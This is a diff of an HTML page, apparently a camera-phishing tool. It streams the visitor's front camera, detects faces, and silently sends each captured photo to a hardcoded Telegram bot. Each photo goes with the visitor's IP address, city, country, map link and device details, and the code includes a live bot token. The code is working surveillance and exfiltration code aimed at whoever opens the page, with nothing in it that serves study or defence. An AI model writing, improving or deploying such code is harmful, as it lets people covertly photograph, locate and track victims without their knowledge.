@@ -3,85 +3,104 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Auto Telegram Camera</title>
+<title>Face Detect Auto Telegram</title>
 
 <style>
-    body {
-        margin: 0;
-        background: black;
-        color: white;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        height: 100vh;
-        font-family: sans-serif;
-    }
-    video {
-        width: 100%;
-        max-width: 360px;
-        transform: scaleX(-1);
-        border: 2px solid #0f0;
-    }
-    button {
-        margin-top: 12px;
-        padding: 10px 20px;
-        font-size: 16px;
-    }
+body {
+    margin: 0;
+    background: black;
+    color: white;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+    font-family: sans-serif;
+}
+video {
+    width: 100%;
+    max-width: 360px;
+    transform: scaleX(-1);
+    border: 2px solid #0f0;
+}
+button {
+    margin-top: 12px;
+    padding: 10px 20px;
+    font-size: 16px;
+}
 </style>
 </head>
+
 <body>
 
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas" style="display:none;"></canvas>
-
-<button onclick="start()">START</button>
+<button onclick="start()">▶ START</button>
 
 <script>
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 
-/*
-BOT_TOKEN:
-Telegram bot authentication token
-*/
+/* Telegram bot token */
 const BOT_TOKEN = "7917384016:AAG7cxyuts9UJ-Km0BMqBeQVJEJfstH239g";
 
-/*
-CHAT_ID:
-Destination chat where images will be sent
-*/
-const CHAT_ID  = "8319568593";
+/* Telegram receiver chat id (your ID / group ID) */
+const CHAT_ID = "8319568593";
 
 let intervalId = null;
-let userIP = "Unknown";
+let locationData = "Location not available";
+let mapLink = "N/A";
 
-/* Fetch public IP address */
-fetch("https://api.ipify.org?format=json")
-  .then(r => r.json())
-  .then(d => userIP = d.ip)
-  .catch(() => userIP = "Unavailable");
+/* 🔹 Get IP + location */
+fetch("https://ipapi.co/json/")
+.then(res => res.json())
+.then(data => {
+    if (data.latitude && data.longitude) {
+        mapLink = `https://maps.google.com/?q=${data.latitude},${data.longitude}`;
+        locationData = `
+🌍 Location
+• City: ${data.city}
+• Region: ${data.region}
+• Country: ${data.country_name}
+• IP: ${data.ip}
+• Map: ${mapLink}
+        `;
+    }
+});
 
-/* Front camera access */
+/* 🔹 Front camera */
 navigator.mediaDevices.getUserMedia({
     video: { facingMode: "user" }
-}).then(stream => video.srcObject = stream);
+}).then(stream => {
+    video.srcObject = stream;
+});
 
-/* Face detection API (Chrome Android supported) */
+/* 🔹 Face detector */
 const faceDetector = ("FaceDetector" in window)
     ? new FaceDetector({ fastMode: true })
     : null;
 
 function start() {
-    if (!faceDetector) return;
+    if (!faceDetector) {
+        console.error("FaceDetector not supported");
+        return;
+    }
     if (intervalId) return;
-    intervalId = setInterval(detectAndSend, 2000);
+    intervalId = setInterval(detectFaceAndSend, 2000);
 }
 
-async function detectAndSend() {
-    const faces = await faceDetector.detect(video);
-    if (faces.length === 0) return;
+async function detectFaceAndSend() {
+    try {
+        const faces = await faceDetector.detect(video);
+        if (faces.length > 0) {
+            captureAndSend();
+        }
+    } catch (e) {
+        console.error(e);
+    }
+}
 
+function captureAndSend() {
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
 
@@ -92,24 +111,27 @@ async function detectAndSend() {
 
     canvas.toBlob(blob => {
 
-        const caption =
-`Device Info
-User Agent: ${navigator.userAgent}
-Platform: ${navigator.platform}
-Language: ${navigator.language}
-Screen: ${screen.width}x${screen.height}
-Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-IP: ${userIP}
-Time: ${new Date().toLocaleString()}`;
+        const caption = `
+📸 Face Detected
 
-        const form = new FormData();
-        form.append("chat_id", CHAT_ID);
-        form.append("photo", blob);
-        form.append("caption", caption);
+📱 Device
+• UA: ${navigator.userAgent}
+• Platform: ${navigator.platform}
+• Screen: ${screen.width}x${screen.height}
+• Language: ${navigator.language}
+• Time: ${new Date().toLocaleString()}
 
-        fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendPhoto\`, {
+${locationData}
+        `;
+
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", blob);
+        formData.append("caption", caption);
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
             method: "POST",
-            body: form
+            body: formData
         });
 
     }, "image/jpeg", 0.7);
